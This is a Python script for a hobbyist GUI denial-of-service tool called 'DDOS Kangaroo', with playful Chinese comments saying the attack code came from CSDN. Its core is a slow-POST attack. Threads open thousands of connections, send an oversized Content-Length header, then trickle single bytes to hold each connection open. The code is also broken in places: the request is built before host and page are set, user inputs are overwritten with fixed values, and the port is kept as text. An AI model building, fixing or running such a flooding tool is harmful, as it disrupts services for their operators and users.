import socket,time,threading,easygui
import tkinter as tk
from tkinter import messagebox

# 这块是屎山，不要管
PAGE = ''
MAX_CONN = ''
PORT = 80
HOST = ''

# 加载写好的Button组件和Tkinter
def loadTkinter():
    global SetPageBtn,SetHostBtn,SetMaxConnBtn,SetPortBtn,StartBtn,window
    window = tk.Tk()
    window.title("DDOS Kangaroo By Yakamo")
    window.geometry('500x250')
    window.resizable(0,0)
    SetHostBtn = tk.Button(window,text='设置主机',width=15,height=2,bd=1,command=setHost)
    SetMaxConnBtn = tk.Button(window,text='设置最大连接数',width=15,height=2,bd=1,command=setMaxconn)
    SetPortBtn = tk.Button(window, text='设置端口', width=15, height=2, bd=1,command=setPort)
    SetPageBtn = tk.Button(window, text='设置页面', width=15, height=2, bd=1,command=setPage)
    StartBtn = tk.Button(window,text='开始DDOS',width=20,height=3,bd=1,command=startDos)

# 放置按钮，不要在意这个函数名:/
def placeBtnAndLabel():
    SetHostBtn.place(x=10,y=25)
    SetMaxConnBtn.place(x=130, y=25)
    SetPortBtn.place(x=250, y=25)
    SetPageBtn.place(x=370,y=25)
    StartBtn.place(x=170,y=150)

# 设置页面
def setPage():
    global PAGE
    Temp = easygui.enterbox()
    if not Temp:
        messagebox.showwarning(title='Warn', message='页面未设置，已自动设置为 /')
        PAGE = '/'
    else:
        messagebox.showinfo(title='Info', message='设置成功')
        PAGE = '/{0}'.format(str(Temp))

# 设置最大连接数
def setMaxconn():
    global MAX_CONN
    Temp = easygui.enterbox()
    if not Temp:
        messagebox.showerror(title='Err',message='最大连接数不能为空')
    else:
        messagebox.showinfo(title='Info', message='设置成功')
        MAX_CONN = 20000 # 但是设置完会自动将最大连接数设为20000

# 设置端口
def setPort():
    global PORT
    Temp = easygui.enterbox()
    if not Temp:
        messagebox.showwarning(title='Warn',message='端口未设置，已自动设置为80')
        PORT = 80
    else:
        messagebox.showinfo(title='Info', message='设置成功')
        PORT = Temp

# 设置主机
def setHost():
    global HOST
    Temp = easygui.enterbox()
    if not Temp:
        messagebox.showerror(title='Err',message='主机未设置')
    else:
        messagebox.showinfo(title='Info',message='设置成功')
        HOST = '192.168.1.1' # 设置完主机就自动改为192.168.1.1，十分人性

buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 10000000\r\n"
       "Cookie: dos_attack_test\r\n"
       "\r\n" % (PAGE, HOST))

socks = []

# 下面是csdn抄来的攻击脚本
def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode())
            print("[debug] 成功连接,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("[debug] 无法连接服务器:%s" % ex)

def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode())
            except Exception as ex:
                print("[debug] 发送异常:%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(1)

conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())
conn_th2 = threading.Thread(target=conn_thread, args=())
send_th2 = threading.Thread(target=send_thread, args=())

# 攻击前的检测:/
def startDos():
    if not HOST:
        messagebox.showerror(title='Err',message='主机未设置，无法开启DDOS')
    elif not PAGE:
        messagebox.showerror(title='Err',message='页面未设置，无法开启DDOS')
    elif not MAX_CONN:
        messagebox.showerror(title='Err',message='最大连接数未设置，无法开启DDOS')
    else:
        conn_th.start()
        send_th.start()
        conn_th2.start()

loadTkinter()
placeBtnAndLabel()

# 设置窗口主循环，但是设置和不设置没有任何区别 :/
window.mainloop()
